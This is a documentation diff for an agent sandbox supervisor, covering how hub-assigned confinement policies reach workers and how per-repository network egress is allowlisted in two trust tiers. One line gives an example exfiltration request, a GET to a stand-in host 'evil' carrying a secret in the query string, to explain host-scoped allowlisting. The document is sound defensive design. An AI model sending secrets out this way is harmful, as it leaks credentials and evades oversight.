@@ -132,6 +132,89 @@ mac-openshell-supervisor --agent-id agent_hub --policy "$MAC_OPENSHELL_POLICY" -
 | `MAC_OPENSHELL_STALE_AFTER_SECONDS` | `86400` | minimum age for automatic sandbox garbage collection |
 | `MAC_OPENSHELL_CREATE_ARGS` | _(none)_ | extra `sandbox create` args (shell-split), e.g. `--from img`, `--upload /src:/src` |
 | `MAC_OPENSHELL_ENV_PASSTHROUGH` | hub+gateway vars | comma list of env names forwarded through the private sandbox environment file |
+| `MAC_OPENSHELL_TASK_EGRESS` | _(off)_ | render per-repo egress into each task's policy (ADR 0009 §2a; see below) |
+| `MAC_OPENSHELL_POLICY_SYNC` | `1` | worker pulls its hub-assigned policy between tasks (see below) |
+
+## Policy delivery: the hub assignment reaches the worker
+
+`mac openshell policy assign <policy> <agent>` used to record intent only. The
+executor resolved its policy from `MAC_OPENSHELL_POLICY`,
+`~/.mac/openshell-policy.yaml`, or the bundled fail-closed default — and
+`~/.mac/openshell-policy.yaml` was written once at provision time by
+`bootstrap-openshell.sh`. A reassignment therefore reached a running worker only
+via a re-bootstrap.
+
+The worker now converges on its assignment. Between tasks (never mid-task — the
+executor reads the policy when it creates a sandbox) it pulls
+`GET /agents/{id}/openshell/policy`, and if the checksum differs from what is on
+disk it installs the text at `~/.mac/openshell-policy.yaml` via write-then-rename
+at mode `0600`, then reports convergence so `mac openshell policy deploy-status`
+reflects the host rather than the intent.
+
+Deliberate properties:
+
+- **Self-only.** The route carries the `agent` scope, not the generic `read` a
+  GET would otherwise get, and binds the path agent to the token principal — the
+  same treatment as `/agents/{id}/directives/effective`. A policy names the
+  fleet's hub/gateway hosts and the binaries allowed to reach them.
+- **`MAC_OPENSHELL_POLICY` still wins.** An explicit operator override is never
+  overwritten; silently replacing the file it points at would make the override a
+  lie.
+- **Fail-safe, not fail-open.** An unreachable hub, a missing assignment, or a
+  malformed response leaves the existing policy in place. Confinement is never
+  dropped because delivery failed.
+
+## Per-repo egress (ADR 0009 §2a)
+
+Deny-by-default egress is right for an unknown repo, but a real repository has to
+reach its package registry. Before this landed the only way to allow that was to
+declare the hosts **fleet-wide** in the operator template, so every sandbox in
+the fleet carried the union of every repo's egress.
+
+With `MAC_OPENSHELL_TASK_EGRESS=1`, the executor widens *that task's* policy from
+the environment contract the worker derived for the repository, and only that
+task's. The base policy is **appended to, never rewritten**, so expansion cannot
+relax a filesystem rule, the Landlock posture, or `run_as_user`.
+
+### Two trust tiers, because derivation is untrusted
+
+`derive_environment_contract` reads `.npmrc` and lockfile resolution URLs from
+the repository **working tree**, which anyone who can open a pull request
+controls. Derivation is therefore a *proposal*, never a grant
+(`src/mac/sandbox_egress.py`):
+
+| Tier | Source | Granted when |
+| --- | --- | --- |
+| `derived_trusted_registry` | repo working tree | the host exactly matches the reviewed `TRUSTED_REGISTRY_HOSTS` allowlist |
+| `hub_declared` | task `metadata.egress_contract.hosts` | the host is well-formed |
+
+A lockfile naming `evil.example` is refused and reported as a contract gap, not
+granted. The declared tier reads **top-level** task metadata on purpose:
+`metadata.runtime` is worker-written and so carries only repo trust, whereas
+top-level task metadata was set through an authenticated hub credential.
+
+Every grant is `access: read-only` and host-scoped — host-allowlisting is the
+axis, because `GET https://evil/?x=<secret>` is exfiltration with a GET.
+
+### Operating it
+
+- Off by default: a repo must not be able to widen its own sandbox by adding a
+  lockfile entry, so enabling this is an operator act.
+- Every decision emits a `sandbox_egress_decision` telemetry event carrying
+  grants **and** refusals. A denied fetch is otherwise diagnosed as a flaky
+  network several runs later.
+- Read-only repository reports never expand: they attest the `policy_sha256`
+  they ran under, and a per-task policy would invalidate that attestation.
+- A fleet with a private registry overrides the allowlist rather than
+  weakening it: pass `trusted_registries` to `classify_egress_hosts`.
+- The **bundled fail-closed default is never expanded.** It ends
+  `network_policies: {}`, and widening it would turn "unconfigured deployment
+  fails closed" into "unconfigured deployment has egress". Expansion requires a
+  base policy that already declares a non-empty `network_policies` block — i.e.
+  a real operator policy.
+- If rendering fails for any reason the task runs on the base policy, so it
+  fails the way it did before the feature existed (a denied fetch) rather than
+  failing open or losing the run.
 
 ## Verify (requires Docker Engine/Moby + OpenShell installed)
 
